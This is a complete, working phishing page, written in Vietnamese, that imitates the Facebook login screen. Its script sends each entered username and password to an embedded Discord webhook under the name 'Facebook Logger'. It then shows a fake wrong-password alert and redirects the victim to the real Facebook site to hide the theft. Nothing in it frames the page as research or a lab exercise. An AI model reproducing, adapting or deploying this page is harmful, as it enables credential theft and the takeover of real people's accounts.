<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Đăng nhập hoặc đăng ký</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to bottom right, #f0f2f5, #ffffff);
      font-family: Helvetica, Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: #fff;
      padding: 30px 20px;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
      width: 360px;
      text-align: center;
    }
    .container img {
      width: 60px;
      margin-bottom: 20px;
    }
    .container input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #ccd0d5;
      border-radius: 6px;
      font-size: 16px;
    }
    .container button {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 18px;
      font-weight: bold;
      margin-top: 10px;
      cursor: pointer;
    }
    .container button:hover {
      background-color: #166fe5;
    }
    .container a {
      display: block;
      margin-top: 15px;
      color: #1877f2;
      text-decoration: none;
      font-size: 14px;
    }
    .container a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<div class="container">
  <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
  <input type="text" id="username" placeholder="Số di động hoặc email">
  <input type="password" id="password" placeholder="Mật khẩu">
  <button onclick="sendToDiscord()">Đăng nhập</button>
  <a href="#">Bạn quên mật khẩu ư?</a>
</div>

<script>
function sendToDiscord() {
  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;

  if (!username || !password) {
    alert("Vui lòng nhập đầy đủ thông tin!");
    return;
  }

  var webhook = "https://discord.com/api/webhooks/1366030714214154260/ZAi-L4U2zXtmbx1ScW5CYxZ4cPDzQ1cf3eCj1GTLlxLwYByuqZeW4fBsw14iqn8KMIai";

  fetch(webhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      username: "Facebook Logger",
      content: "**Username:** " + username + "\n**Password:** " + password
    })
  }).then(() => {
    alert("Sai mật khẩu. Vui lòng thử lại!");
    window.location.href = "https://www.facebook.com"; // redirect facebook thật
  }).catch((error) => {
    console.error("Lỗi gửi Discord:", error);
  });
}
</script>

</body>
</html>
